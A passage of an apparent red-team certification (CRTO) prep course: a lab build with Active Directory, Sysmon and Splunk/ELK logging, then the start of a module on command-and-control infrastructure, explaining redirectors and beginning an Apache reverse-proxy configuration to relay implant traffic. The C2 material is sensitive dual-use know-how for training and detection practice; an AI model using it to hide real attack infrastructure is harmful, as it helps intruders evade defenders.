tools) from which you&#39;ll launch attacks. This machine might sit on a different network segment or need specific routing.</li>\n<li><strong>SIEM/Logging Server:</strong> A VM (Linux or Windows depending on the SIEM choice) to receive and analyze logs from the other machines. This is your &quot;defender&#39;s view.&quot;</li>\n</ol>\n<h4>2.2 Setting up Your Local Lab: Deploying the VMs</h4>\n<p>Let&#39;s get the virtual machines themselves deployed.</p>\n<p><strong>Step 1: Obtain Necessary Software</strong></p>\n<ul>\n<li><strong>Hypervisor:</strong> Download and install your chosen hypervisor (VMware, VirtualBox, Hyper-V).</li>\n<li><strong>Operating System ISOs:</strong><ul>\n<li><strong>Windows Server:</strong> Download an evaluation ISO (e.g., Windows Server 2019 or 2022) from Microsoft&#39;s Evaluation Center.</li>\n<li><strong>Windows Client:</strong> Download an evaluation ISO (e.g., Windows 10 or 11) from Microsoft&#39;s Evaluation Center.</li>\n<li><strong>Linux (for Attacker/SIEM):</strong> Download an ISO for Kali Linux, Ubuntu Server, or Debian.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Step 2: Create the Virtual Machines</strong></p>\n<p>Using your hypervisor, create new virtual machines for each component. Here are <em>minimum recommended</em> specs; adjust based on your host machine&#39;s resources:</p>\n<ul>\n<li><strong>Domain Controller (Windows Server):</strong><ul>\n<li>OS Type: Microsoft Windows (select appropriate version)</li>\n<li>CPU: 2 cores</li>\n<li>RAM: 4 GB</li>\n<li>HDD: 60 GB (Dynamically allocated is fine for space saving)</li>\n<li>Network Adapter: Set to a custom <strong>Internal</strong> or <strong>Host-Only</strong> network (we&#39;ll configure this specifically in the next section).</li>\n</ul>\n</li>\n<li><strong>Target Workstation (Windows 10/11):</strong><ul>\n<li>OS Type: Microsoft Windows (select appropriate version)</li>\n<li>CPU: 2 cores</li>\n<li>RAM: 4 GB</li>\n<li>HDD: 60 GB</li>\n<li>Network Adapter: Set to the <em>same</em> custom <strong>Internal</strong> or <strong>Host-Only</strong> network as the DC.</li>\n</ul>\n</li>\n<li><strong>Attacker Machine (Kali/Ubuntu):</strong><ul>\n<li>OS Type: Linux (select appropriate version)</li>\n<li>CPU: 2 cores</li>\n<li>RAM: 4 GB</li>\n<li>HDD: 60 GB</li>\n<li>Network Adapter 1: <strong>NAT</strong> (to access the internet for updates, tool downloads).</li>\n<li>Network Adapter 2: Set to the <em>same</em> custom <strong>Internal</strong> or <strong>Host-Only</strong> network as the DC/Target (to interact with the lab).</li>\n</ul>\n</li>\n<li><strong>SIEM Server (Ubuntu/Debian/Windows):</strong><ul>\n<li>OS Type: Linux or Windows</li>\n<li>CPU: 2-4 cores (SIEM can be resource intensive)</li>\n<li>RAM: 8 GB+ (More is better for SIEM)</li>\n<li>HDD: 100 GB+ (Logs consume space!)</li>\n<li>Network Adapter: Set to the <em>same</em> custom <strong>Internal</strong> or <strong>Host-Only</strong> network as the DC/Target.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Step 3: Install the Operating Systems</strong></p>\n<p>Mount the ISOs to the respective VMs and go through the standard OS installation process for each.</p>\n<ul>\n<li><strong>Windows VMs:</strong> Follow the on-screen prompts. Set a strong password for the Administrator account. Choose the &quot;Desktop Experience&quot; version for the server if you prefer a GUI.</li>\n<li><strong>Linux VMs:</strong> Follow the distribution&#39;s installation guide. Create a non-root user account. Ensure SSH is installed and enabled if you plan to manage it remotely.</li>\n</ul>\n<blockquote>\n<p><strong>Pro Tip:</strong> After installing each OS but <em>before</em> making significant configuration changes (like promoting the DC), take a snapshot of the VM. This gives you a clean baseline to revert to if something goes wrong later. Install VMware Tools/Guest Additions in each VM for better performance and usability.</p>\n</blockquote>\n<h4>2.3 Configuring a Basic Active Directory Domain</h4>\n<p>Active Directory is fundamental to most enterprise networks. Setting up a basic domain is crucial for simulating realistic scenarios involving domain users, group policies, and Windows authentication.</p>\n<p><strong>Step 1: Configure the Domain Controller&#39;s Network</strong></p>\n<p>On your Windows Server VM (the future DC):</p>\n<ol>\n<li>Open Network Connections (<code>ncpa.cpl</code>).</li>\n<li>Right-click your network adapter and select &quot;Properties.&quot;</li>\n<li>Select &quot;Internet Protocol Version 4 (TCP/IPv4)&quot; and click &quot;Properties.&quot;</li>\n<li>Choose &quot;Use the following IP address&quot; and assign a static IP within your chosen internal network range (e.g., <code>192.168.100.10</code>).</li>\n<li>Set the Subnet mask (e.g., <code>255.255.255.0</code>).</li>\n<li>Leave Default gateway empty <em>if</em> this network is purely internal with no internet access. If using NAT on the host and routing through it, set the gateway IP. For a simple internal lab, no gateway is fine.</li>\n<li>For <strong>Preferred DNS server</strong>, point it to <em>itself</em> (<code>127.0.0.1</code>). This server will become the DNS server for the domain.</li>\n<li>Click OK.</li>\n</ol>\n<p><strong>Step 2: Install Active Directory Domain Services (AD DS)</strong></p>\n<ol>\n<li>Open <strong>Server Manager</strong>.</li>\n<li>Click &quot;Manage&quot; -&gt; &quot;Add Roles and Features.&quot;</li>\n<li>Click &quot;Next&quot; through the initial screens (Role-based or feature-based installation, select server).</li>\n<li>Under &quot;Server Roles,&quot; check the box for &quot;<strong>Active Directory Domain Services</strong>.&quot;</li>\n<li>Click &quot;Add Features&quot; when prompted for required features.</li>\n<li>Click &quot;Next&quot; through Features (defaults are usually fine).</li>\n<li>Click &quot;Next&quot; on the AD DS screen.</li>\n<li>Click &quot;Install.&quot;</li>\n</ol>\n<p><strong>Step 3: Promote the Server to a Domain Controller</strong></p>\n<ol>\n<li>Once the installation is complete, a flag notification will appear in Server Manager. Click the flag and select &quot;<strong>Promote this server to a domain controller</strong>.&quot;</li>\n<li>In the Deployment Configuration wizard:<ul>\n<li>Select &quot;<strong>Add a new forest</strong>.&quot;</li>\n<li>Enter a Root domain name (e.g., <code>mylabs.local</code>). Click &quot;Next.&quot;</li>\n</ul>\n</li>\n<li>Domain Controller Options:<ul>\n<li>Keep &quot;Domain Name System (DNS) server&quot; and &quot;Global Catalog (GC)&quot; checked.</li>\n<li>Enter a Directory Services Restore Mode (DSRM) password. <strong>Remember this password!</strong> Click &quot;Next.&quot;</li>\n</ul>\n</li>\n<li>DNS Options: Ignore the DNS delegation warning for a lab. Click &quot;Next.&quot;</li>\n<li>NetBIOS Domain Name: Verify the name (e.g., <code>MYLABS</code>). Click &quot;Next.&quot;</li>\n<li>Paths: Keep default paths. Click &quot;Next.&quot;</li>\n<li>Prerequisites Check: Review settings. Click &quot;Next.&quot;</li>\n<li>Click &quot;<strong>Install</strong>.&quot; The server will configure AD DS and automatically reboot.</li>\n</ol>\n<p><strong>Step 4: Create Users and Groups</strong></p>\n<p>After the server reboots and becomes a DC:</p>\n<ol>\n<li>Log in as the Administrator (using the password you set during OS install).</li>\n<li>Open <strong>Server Manager</strong>.</li>\n<li>Click &quot;Tools&quot; -&gt; &quot;<strong>Active Directory Users and Computers</strong>.&quot;</li>\n<li>Right-click your domain (<code>mylabs.local</code>) -&gt; &quot;New&quot; -&gt; &quot;<strong>Organizational Unit</strong>.&quot; Name it something logical like <code>LabUsers</code>.</li>\n<li>Right-click the new OU (<code>LabUsers</code>) -&gt; &quot;New&quot; -&gt; &quot;<strong>User</strong>.&quot;<ul>\n<li>Fill in First name, Last name, User logon name (e.g., <code>analyst</code>). Click &quot;Next.&quot;</li>\n<li>Set a password. <strong>Uncheck</strong> &quot;User must change password at next logon&quot; and <strong>check</strong> &quot;Password never expires&quot; for lab convenience (less realistic, but easier). Click &quot;Next&quot; -&gt; &quot;Finish.&quot;</li>\n</ul>\n</li>\n<li>(Optional) Create a Group: Right-click <code>LabUsers</code> OU -&gt; &quot;New&quot; -&gt; &quot;<strong>Group</strong>.&quot; Name it <code>LabAdmins</code>. Set scope/type (Global, Security). Click OK.</li>\n<li>(Optional) Add User to Group: Double-click the <code>LabAdmins</code> group -&gt; &quot;Members&quot; tab -&gt; &quot;Add...&quot;. Type the user logon name (<code>analyst</code>) and click &quot;Check Names.&quot; Click OK -&gt; OK.</li>\n</ol>\n<p><strong>Step 5: Join Client Machine to the Domain</strong></p>\n<p>On your Windows Client VM:</p>\n<ol>\n<li>Configure its network adapter to use a static IP or DHCP, but crucially, set its <strong>Preferred DNS server</strong> to the IP address of your Domain Controller (e.g., <code>192.168.100.10</code>).</li>\n<li>Right-click the Start button -&gt; &quot;System&quot; (or go to Settings -&gt; System -&gt; About).</li>\n<li>Click &quot;<strong>Rename this PC (Advanced)</strong>&quot; or &quot;Advanced system settings&quot; -&gt; &quot;Computer Name&quot; tab.</li>\n<li>Click &quot;<strong>Change...</strong>&quot;.</li>\n<li>Under &quot;Member of,&quot; select &quot;Domain&quot; and enter your domain name (e.g., <code>mylabs.local</code>).</li>\n<li>Click OK. You&#39;ll be prompted for domain credentials. Enter the Administrator username and password <em>of the domain</em> (the one you set during the DC promotion).</li>\n<li>Click OK. You should see a welcome message.</li>\n<li>Click OK and reboot the client machine when prompted.</li>\n</ol>\n<p>After rebooting, you should be able to log in using a domain user account (e.g., <code>MYLABS\\analyst</code> or <code>analyst@mylabs.local</code> and the password you set).</p>\n<h4>2.4 Basic Network Configuration</h4>\n<p>Understanding how your VMs talk to each other and the outside world is key.</p>\n<ul>\n<li><strong>Internal/Host-Only Network:</strong> This is the recommended setup for your lab network segment containing the DC, Target, and SIEM. VMs on this network can <em>only</em> communicate with each other and potentially the host machine (depending on hypervisor config). They cannot access the internet unless routed through another VM or the host. This isolates your lab traffic.</li>\n<li><strong>NAT (Network Address Translation):</strong> This adapter type allows a VM to access the internet by sharing the host&#39;s IP address. The host performs NAT, translating the VM&#39;s private IP to the host&#39;s public IP. VMs on a NAT network <em>cannot</em> be easily accessed from the host or other networks (inbound connections are blocked by default). Your Attacker VM might use this for tool downloads/updates.</li>\n<li><strong>Bridged:</strong> The VM gets an IP address on the <em>same</em> network as your host machine. This is generally <strong>not recommended</strong> for offensive labs as your lab traffic could interfere with or be visible on your home/work network.</li>\n</ul>\n<p><strong>Recommended Lab Network Setup:</strong></p>\n<ul>\n<li>Create a dedicated <strong>Internal</strong> or <strong>Host-Only</strong> network in your hypervisor settings (e.g., name it <code>CRTO_Lab_Net</code>). Assign it a private IP range (e.g., 192.168.100.0/24).</li>\n<li>Configure the DC with a static IP on this network (e.g., 192.168.100.10), pointing its DNS to itself.</li>\n<li>Configure the Target and SIEM VMs with static IPs or DHCP on this network, pointing their DNS to the DC&#39;s IP (192.168.100.10).</li>\n<li>Configure the Attacker VM with <em>two</em> network adapters:<ul>\n<li>One NAT adapter for internet access.</li>\n<li>One adapter on the <code>CRTO_Lab_Net</code> (192.168.100.0/24) to interact with lab machines.</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p><strong>Troubleshooting Tip:</strong> If VMs can&#39;t communicate, check:</p>\n<ol>\n<li>Are they on the <em>same</em> virtual network (Internal/Host-Only)?</li>\n<li>Are their IP addresses and subnet masks correct for that network?</li>\n<li>Is the DNS server setting correct (pointing to the DC)?</li>\n<li>Are Windows Firewalls blocking traffic? (For lab convenience, you might temporarily disable Windows Firewall on target VMs, but be aware this reduces realism).</li>\n</ol>\n</blockquote>\n<h4>2.5 Introduction to Hybrid Labs (Conceptual)</h4>\n<p>While we focus on local labs, it&#39;s worth understanding how hybrid labs work, as CRTO involves cloud components.</p>\n<p>A hybrid lab typically involves:</p>\n<ul>\n<li>A local network (your VMs).</li>\n<li>A cloud network (e.g., Azure VNet, AWS VPC) with VMs.</li>\n<li>A secure connection between them (VPN or Peering).</li>\n</ul>\n<p>This allows you to simulate attacking cloud resources from an on-premise perspective, or simulate C2 infrastructure hosted in the cloud communicating with on-premise implants.</p>\n<ul>\n<li><strong>Azure/AWS Free Tier:</strong> You can often create small VMs and set up basic networking using free tier credits. This is a great way to experiment.</li>\n<li><strong>Networking:</strong> You&#39;ll need to understand Virtual Networks, Subnets, Network Security Groups (firewalls), and potentially VPN Gateways or Peering connections to link your local lab network to the cloud network.</li>\n<li><strong>Domain Services:</strong> You could extend your on-prem AD to the cloud, or set up Azure AD DS in the cloud.</li>\n</ul>\n<p>For this module, just grasp the <em>concept</em> – extending your lab environment beyond your local machine to include cloud components, mirroring how many modern enterprises operate. We won&#39;t build a full hybrid lab <em>yet</em>, but the local AD setup is a prerequisite for understanding identity in both environments.</p>\n<h4>2.6 Deploying and Configuring Sysmon</h4>\n<p>Sysmon (System Monitor) is an essential Windows Sysinternals tool that provides detailed information about process creation, network connections, file system changes, registry modifications, and much more. It&#39;s <em>critical</em> for understanding what activity looks like from a detection perspective.</p>\n<p><strong>Step 1: Download Sysmon</strong></p>\n<p>Download the Sysmon zip file from the Microsoft Sysinternals page. Extract it to a known location (e.g., <code>C:\\Tools\\Sysmon</code>).</p>\n<p><strong>Step 2: Obtain a Sysmon Configuration File</strong></p>\n<p>Running Sysmon without a configuration file generates an overwhelming amount of noise. A good configuration file filters out benign activity and highlights events relevant to security monitoring. The most widely used and recommended configuration is SwiftOnSecurity&#39;s <code>sysmon-config</code>.</p>\n<ul>\n<li>Download the latest <code>sysmonconfig-export.xml</code> from the SwiftOnSecurity/Sysmon repository on GitHub. Save it in the same folder as your Sysmon executable.</li>\n</ul>\n<p><strong>Step 3: Install Sysmon with the Configuration File</strong></p>\n<p>Open an <strong>Administrator</strong> Command Prompt or PowerShell window on your target workstation VM. Navigate to the directory where you saved <code>Sysmon64.exe</code> and the config file.</p>\n<p>Execute the following command:</p>\n<pre><code class=\"language-cmd\">Sysmon64.exe -i sysmonconfig-export.xml\n</code></pre>\n<ul>\n<li><code>-i</code>: Installs the Sysmon service.</li>\n<li><code>sysmonconfig-export.xml</code>: Specifies the configuration file to use.</li>\n</ul>\n<p>You should see output indicating that the service was installed successfully.</p>\n<p><strong>Step 4: Verify Sysmon is Running and Logging</strong></p>\n<ol>\n<li>Check the Sysmon service: Open Services (<code>services.msc</code>) and verify that the &quot;Sysmon&quot; service is running.</li>\n<li>Check Event Viewer: Open Event Viewer (<code>eventvwr.msc</code>). Navigate to <code>Applications and Services Logs</code> -&gt; <code>Microsoft</code> -&gt; <code>Windows</code> -&gt; <code>Sysmon</code> -&gt; <code>Operational</code>.</li>\n<li>You should see recent events logged by Sysmon. Event ID 1 is Process Creation, which is very common. Try running <code>calc.exe</code> and refresh the Sysmon Operational log – you should see an Event ID 1 for <code>calc.exe</code>.</li>\n</ol>\n<p><strong>Key Sysmon Event IDs to Pay Attention To (Based on SwiftOnSecurity config &amp; CRTO relevance):</strong></p>\n<ul>\n<li><strong>Event ID 1: Process Creation:</strong> Logs every new process with parent process, command line, user, hash, etc. (Crucial for seeing execution).</li>\n<li><strong>Event ID 3: Network Connection:</strong> Logs TCP/UDP connections with source/destination IPs, ports, process name. (Crucial for seeing C2 callbacks).</li>\n<li><strong>Event ID 6: Driver Loaded:</strong> Logs information about a driver being loaded.</li>\n<li><strong>Event ID 7: Image Loaded:</strong> Logs when a module (DLL) is loaded into a process.</li>\n<li><strong>Event ID 8: CreateRemoteThread:</strong> Logs when a thread is created in another process. (Relevant for process injection).</li>\n<li><strong>Event ID 11: FileCreate:</strong> Logs file creation. (Useful for tracking dropped payloads).</li>\n<li><strong>Event ID 12/13/14: Registry Event:</strong> Logs registry key/value create/delete/rename/set. (Crucial for persistence).</li>\n<li><strong>Event ID 15: FileCreateStreamHash:</strong> Logs when a named stream is created (often used for malicious purposes).</li>\n<li><strong>Event ID 17/18: Pipe Event:</strong> Logs named pipe creation/connection. (Used for inter-process communication, sometimes maliciously).</li>\n<li><strong>Event ID 22: DNSEvent:</strong> Logs DNS queries. (Crucial for DNS C2 or resolving malicious domains).</li>\n<li><strong>Event ID 23: FileDelete:</strong> Logs when a file is deleted.</li>\n<li><strong>Event ID 26: FileChangeTime:</strong> Logs when a file timestamp is changed (timestomping).</li>\n</ul>\n<p>Understanding these event IDs is key to analyzing logs from an adversary simulation.</p>\n<h4>2.7 Setting up Basic Logging Infrastructure (SIEM)</h4>\n<p>Seeing the raw logs in Event Viewer is useful, but for analysis, correlation, and searching across multiple machines, you need a SIEM (Security Information and Event Management) or logging platform. We&#39;ll focus on getting logs <em>into</em> a platform.</p>\n<p><strong>Option 1: Splunk Free (Recommended for beginners)</strong></p>\n<p>Splunk is powerful and widely used. Splunk Free is limited (500 MB/day ingestion) but sufficient for a basic lab.</p>\n<p><strong>Step 1: Install Splunk Enterprise (Free License)</strong></p>\n<ul>\n<li>Download Splunk Enterprise from the Splunk website.</li>\n<li>Install it on your SIEM Server VM (Linux or Windows). Follow the installation wizard.</li>\n<li>During installation, you&#39;ll set an admin username and password.</li>\n<li>After installation, access the web interface (usually <code>http://&lt;SIEM_IP&gt;:8000</code>). Log in.</li>\n</ul>\n<p><strong>Step 2: Install Splunk Universal Forwarder (UF) on Target VM</strong></p>\n<p>Splunk Universal Forwarder is a lightweight agent that sends logs from endpoints to the Splunk server.</p>\n<ul>\n<li>Download the Splunk Universal Forwarder for Windows from the Splunk website.</li>\n<li>Copy the installer to your target workstation VM.</li>\n<li>Run the installer as Administrator.</li>\n<li>Follow the wizard. Key steps:<ul>\n<li>Accept license.</li>\n<li>Choose installation directory.</li>\n<li><strong>Deployment Server:</strong> Skip this (unless you set one up).</li>\n<li><strong>Receiving Indexer:</strong> This is where you point the UF to your Splunk server. Enter the IP address of your Splunk server VM and the receiving port (we&#39;ll configure this next, default is 9997).</li>\n<li><strong>Login Information:</strong> Enter the admin credentials for your Splunk server (set in Step 1).</li>\n<li><strong>Inputs:</strong> You can configure inputs later, skip this for now.</li>\n</ul>\n</li>\n<li>Finish the installation.</li>\n</ul>\n<p><strong>Step 3: Configure Universal Forwarder Inputs (What logs to send)</strong></p>\n<p>You need to tell the UF <em>which</em> logs to send. You can do this via the GUI or by editing configuration files. Editing files is often more precise for specific logs like Sysmon.</p>\n<ul>\n<li>On the target workstation VM, navigate to the UF&#39;s configuration directory: <code>C:\\Program Files\\SplunkUniversalForwarder\\etc\\system\\local\\</code></li>\n<li>Create or edit the <code>inputs.conf</code> file. Add the following stanzas:</li>\n</ul>\n<pre><code class=\"language-ini\">[WinEventLog:Security]\ndisabled = false\n\n[WinEventLog:System]\ndisabled = false\n\n[WinEventLog:Application]\ndisabled = false\n\n[WinEventLog:Microsoft-Windows-Sysmon/Operational]\ndisabled = false\n</code></pre>\n<ul>\n<li>Save the <code>inputs.conf</code> file.</li>\n<li>Restart the Splunk Universal Forwarder service on the target VM: Open Services (<code>services.msc</code>), find &quot;SplunkForwarder&quot;, right-click and restart.</li>\n</ul>\n<p><strong>Step 4: Configure Splunk Server to Receive Data</strong></p>\n<p>On your Splunk Server VM (via the web interface <code>http://&lt;SIEM_IP&gt;:8000</code>):</p>\n<ol>\n<li>Click &quot;Settings&quot; (top right).</li>\n<li>Under &quot;Data,&quot; click &quot;Data Inputs.&quot;</li>\n<li>Under &quot;Local inputs,&quot; click &quot;TCP&quot; (or &quot;UDP&quot; if you prefer, but TCP is reliable).</li>\n<li>Click &quot;<strong>New Local TCP Input</strong>.&quot;</li>\n<li><strong>Port:</strong> Enter the port you specified during the UF installation (default 9997).</li>\n<li><strong>Source type:</strong> Click &quot;Select.&quot; Search for <code>XmlWinEventLog</code> and select it (this sourcetype is good for structured Windows XML events like Sysmon).</li>\n<li><strong>Index:</strong> Keep the default (<code>main</code>) or create a new index if you prefer.</li>\n<li>Click &quot;Review&quot; -&gt; &quot;Submit.&quot;</li>\n</ol>\n<p>Your Splunk server is now listening for logs from the UF on the target VM.</p>\n<p><strong>Option 2: ELK Stack (Elasticsearch, Logstash, Kibana)</strong></p>\n<p>ELK is free and open-source, powerful but generally requires more manual configuration than Splunk.</p>\n<ul>\n<li><strong>Components:</strong><ul>\n<li><strong>Elasticsearch:</strong> The NoSQL database that stores logs.</li>\n<li><strong>Logstash:</strong> A server-side processing pipeline that ingests data from various sources, transforms it, and sends it to Elasticsearch. (Filebeat can often send directly to ES now, making Logstash optional for simple setups).</li>\n<li><strong>Kibana:</strong> The web interface for searching, analyzing, and visualizing logs stored in Elasticsearch.</li>\n<li><strong>Filebeat:</strong> A lightweight agent (like Splunk UF) installed on endpoints to forward logs.</li>\n</ul>\n</li>\n<li><strong>Setup Overview:</strong><ol>\n<li>Install Elasticsearch and Kibana on your SIEM Server VM.</li>\n<li>Install Filebeat on your target workstation VM.</li>\n<li>Configure Filebeat to read Windows Event Logs (Security, System, Application, and the Sysmon Operational log). Filebeat has specific modules for Windows Event Logs and Sysmon that simplify configuration.</li>\n<li>Configure Filebeat to send logs to your Elasticsearch instance.</li>\n<li>Start the services (Elasticsearch, Kibana, Filebeat).</li>\n<li>Access Kibana (usually <code>http://&lt;SIEM_IP&gt;:5601</code>), configure an index pattern (e.g., <code>filebeat-*</code>), and start exploring data in the &quot;Discover&quot; tab.</li>\n</ol>\n</li>\n</ul>\n<p>While ELK is a great option, for this course&#39;s focus on <em>using</em> the logs rather than deep SIEM administration, Splunk Free often has a gentler learning curve for getting data ingested quickly. Choose the path you&#39;re most comfortable exploring.</p>\n<h4>2.8 Verifying Log Collection</h4>\n<p>The most important step after setting up logging is ensuring the logs are actually arriving and are searchable.</p>\n<p><strong>In Splunk:</strong></p>\n<ol>\n<li>Go to the Splunk web interface (<code>http://&lt;SIEM_IP&gt;:8000</code>).</li>\n<li>Click &quot;Search &amp; Reporting&quot; (or &quot;Search&quot; in newer versions).</li>\n<li>In the search bar, enter <code>index=main</code> (replace <code>main</code> if you used a different index). This searches all data in the &#39;main&#39; index.</li>\n<li>To see the different types of logs arriving, add <code>| stats count by sourcetype</code>. You should see <code>WinEventLog:Security</code>, <code>WinEventLog:System</code>, <code>WinEventLog:Application</code>, and critically, <code>XmlWinEventLog</code> (or whatever sourcetype you assigned Sysmon logs).</li>\n<li>To specifically search Sysmon logs, use <code>index=main sourcetype=XmlWinEventLog</code>. Look at the &quot;Time Picker&quot; (top right) to ensure you&#39;re looking at recent data.</li>\n<li>To test in real-time, go to your target VM, open Command Prompt, and type <code>calc.exe</code>.</li>\n</ol>\n\n                </div>\n             </div>\n         ",
    "module-3": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 3: module_3</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, let&#39;s dive headfirst into the operational side! If Module 1 was our strategic planning session and Module 2 was building the battlefield, then Module 3 is setting up our essential lifeline – the Command and Control (C2) infrastructure. Think of this as establishing the secret communication network that our deployed implants will use to call home, receive instructions, and send back valuable intelligence. Without a solid, stealthy C2, our simulation is dead in the water the moment the implant executes. This is where we start building the <em>actual</em> operational components. Let&#39;s get our hands dirty!</p>\n<hr>\n<h2>CRTO Prep Part 1: Adversary Simulation Foundations</h2>\n<h3>Module 3: Establishing Your C2 Infrastructure</h3>\n<ul>\n<li><strong>Module Objective:</strong> By the end of this module, learners will be able to design and configure basic C2 infrastructure components including redirectors and payload hosting mechanisms.</li>\n</ul>\n<hr>\n<p>Welcome back! You&#39;ve got your lab setup, your domain is running, and logging is hopefully humming along in the background. Now, we need to think about the <em>other</em> side of the equation: the attacker infrastructure. This isn&#39;t just about having a server; it&#39;s about having a <em>resilient</em> and <em>stealthy</em> way to communicate with compromised machines. Adversaries don&#39;t just point their malware directly back to their home IP; they use layers and techniques to hide their true location and blend in. That&#39;s what this module is all about.</p>\n<h4>3.1 Command and Control (C2) Concepts</h4>\n<ul>\n<li><p><strong>What is C2 and Why is it Needed?</strong></p>\n<ul>\n<li>Once you get code running on a target machine (initial access!), you need to interact with it. You need to issue commands, upload/download files, pivot to other machines, and manage multiple compromised systems. That&#39;s the role of the C2 framework and its associated infrastructure.</li>\n<li>Think of the implant as a remote agent, and the C2 server as mission control. The implant &quot;calls home&quot; (beacons) to the C2 server, receives tasks, executes them, and reports back the results.</li>\n<li>Without C2, your initial execution is often a one-off event, limiting your ability to conduct further operations.</li>\n</ul>\n</li>\n<li><p><strong>Types of C2 Channels:</strong> Adversaries use various network protocols to communicate, trying to blend in with legitimate traffic.</p>\n<ul>\n<li><strong>HTTP/HTTPS:</strong> The most common. Traffic looks like web browsing. HTTPS provides encryption, making inspection harder (though metadata is still visible). Often goes through web proxies, which can be both a help (blending) and a hindrance (inspection points).</li>\n<li><strong>DNS:</strong> Data is encoded within DNS queries and responses. Very stealthy as DNS traffic is ubiquitous and often less scrutinized than HTTP. Slower and transmits less data per transaction.</li>\n<li><strong>SMB:</strong> Communication over the Server Message Block protocol. Useful for lateral movement within a network and controlling implants on the same segment or domain. Looks like internal file/printer sharing traffic.</li>\n<li><strong>Other:</strong> TCP, UDP, ICMP, specialized protocols, even legitimate services like Twitter or Discord (less common for standard implants, more for exfiltration or dead drops).</li>\n</ul>\n</li>\n<li><p><strong>Characteristics of a Good C2:</strong></p>\n<ul>\n<li><strong>Stealthy:</strong> Blends in with normal network traffic, avoids common detection signatures.</li>\n<li><strong>Resilient:</strong> Can handle network interruptions, multiple implants, and potential infrastructure takedowns (hence the need for redirectors).</li>\n<li><strong>Flexible:</strong> Supports various payload types, communication protocols, and operational commands.</li>\n<li><strong>Manageable:</strong> Provides operators with a clear interface to control implants.</li>\n<li><strong>Extensible:</strong> Allows for adding new capabilities (e.g., post-exploitation modules).</li>\n</ul>\n</li>\n</ul>\n<h4>3.2 Introduction to Redirectors</h4>\n<ul>\n<li><p><strong>Purpose and Benefits:</strong></p>\n<ul>\n<li>Your <em>actual</em> C2 server (where your C2 framework software runs) contains sensitive operational data and is the heart of your operation. If a defender identifies your C2 server&#39;s IP address, they can block it, analyze its traffic, and potentially report it, leading to takedown.</li>\n<li>A <strong>redirector</strong> acts as a proxy or a relay between the implant and your C2 server. The implant talks <em>only</em> to the redirector, and the redirector forwards the traffic to the C2 server.</li>\n<li><strong>Benefits:</strong><ul>\n<li><strong>OpSec (Operational Security):</strong> Hides the true IP of your C2 server. If a redirector is discovered and blocked, you lose <em>that specific communication path</em>, but your main C2 server remains safe. You can quickly spin up a new redirector.</li>\n<li><strong>Scalability:</strong> You can use multiple redirectors pointing to the same C2 server.</li>\n<li><strong>Flexibility:</strong> Redirectors can modify traffic (e.g., change headers, filter requests) before forwarding it, aiding in stealth.</li>\n<li><strong>Blinding Defenders:</strong> Defenders investigating traffic will see the redirector&#39;s IP, not your C2 server&#39;s IP.</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Analogy:</strong> Think of your C2 server as your secret base. You don&#39;t tell your agents (implants) the address of the base. Instead, you tell them to send messages to a specific P.O. Box (the redirector). You then pick up the mail from the P.O. Box and bring it back to your base. If one P.O. Box is compromised, you just set up a new one and tell your agents the new address; the base remains hidden.</p>\n</li>\n</ul>\n<h4>3.3 Configuring Redirectors</h4>\n<p>This is a hands-on section. We&#39;ll focus on the most common and flexible redirector types: Apache and Nginx, and a simple alternative, Socat. We&#39;ll assume a Linux server (like Ubuntu or Kali) for the redirector.</p>\n<p><strong>Prerequisites:</strong></p>\n<ul>\n<li>A Linux VM or cloud instance (e.g., Ubuntu Server 20.04/22.04, Kali Linux).</li>\n<li>Root or <code>sudo</code> access on the Linux machine.</li>\n<li>Basic Linux command-line familiarity.</li>\n<li><strong>Crucially:</strong> You need the IP address and port of your <em>actual</em> C2 server&#39;s beacon listener. For this module&#39;s project, this might just be an internal IP and port for testing, but in a real scenario, your C2 server would likely be elsewhere (another VPS, etc.). Let&#39;s assume your C2 server is at <code>192.168.1.100</code> and its HTTP beacon listener is on port <code>8080</code>. Your redirector has a public IP (or an IP reachable by your target VM in the lab, let&#39;s say <code>192.168.1.50</code>) and will listen on port <code>80</code>.</li>\n</ul>\n<h5>Method 1: Apache2 with mod_rewrite and mod_proxy</h5>\n<p>Apache is a powerful web server that can also act as a reverse proxy and redirector using its modules.</p>\n<p><strong>Steps:</strong></p>\n<ol>\n<li><p><strong>Update and Install Apache2:</strong></p>\n<pre><code class=\"language-bash\">sudo apt update\nsudo apt install apache2 -y\n</code></pre>\n</li>\n<li><p><strong>Enable Necessary Modules:</strong> We need <code>mod_rewrite</code> for pattern-based redirection and <code>mod_proxy</code> and <code>mod_proxy_http</code> to forward traffic.</p>\n<pre><code class=\"language-bash\">sudo a2enmod rewrite\nsudo a2enmod proxy\nsudo a2enmod proxy_http\n</code></pre>\n<p>You might need to restart Apache after enabling modules:</p>\n<pre><code class=\"language-bash\">sudo systemctl restart apache2\n</code></pre>\n</li>\n<li><p><strong>Configure a Virtual Host:</strong> We&#39;ll modify the default Apache configuration or create a new one. It&#39;s often cleaner to create a new file in <code>sites-available</code>. Let&#39;s edit the default for simplicity, but be aware of best practices for real deployments.</p>\n<pre><code class=\"language-bash\">sudo nano /etc/apache2/sites-available/000-default.conf\n</code></pre>\n<p>Inside the <code>&lt;VirtualHost *:80&gt;</code> block, add the following lines (before <code>&lt;/VirtualHost&gt;</code>). Replace <code>YOUR_C2_IP</code> and <code>YOUR_C2_PORT</code>.</p>\n<pre><code class=\"language-apacheconf\"># Enable Rewrite Engine for this Virtual Host\nRewriteEngine On\n\n# Define the C2 server address\n# This isn&#39;t strictly necessary but can make rules cleaner\n# DefineMap c2_server txt:/dev/stdin\n# 1 c2_server_value\n# RewriteRule ^(.*)$ ${c2_server:$1} [P,L] # This isn&#39;t standard, just illustrating the concept\n\n# --- Example Configuration ---\n# This example assumes your C2 beacon listens on /mypath and everything else\n# goes to a default handler or returns 404.\n# A more flexible config would forward based on the C2 framework&#39;s profile.\n# Let&#39;s forward everything for simplicity first, then refine.\n\n# Option 1: Simple Proxy All Traffic\n# This forwards ALL requests arriving at the redirector on port 80\n# to your C2 server&#39;s specific port (e.g., 8080).\n# This is good for basic setups where the C2 framework handles all paths.\nProxyPreserveHost On # Passes the original Host header\nProxyRequests Off    # Disable forward proxying (security)\nProxyVia Full        # Add Via header (can be removed for stealth)\n\n&lt;Proxy *&gt;\n    Require all granted\n&lt;/Proxy&gt;\n\n# Forward all requests to the C2 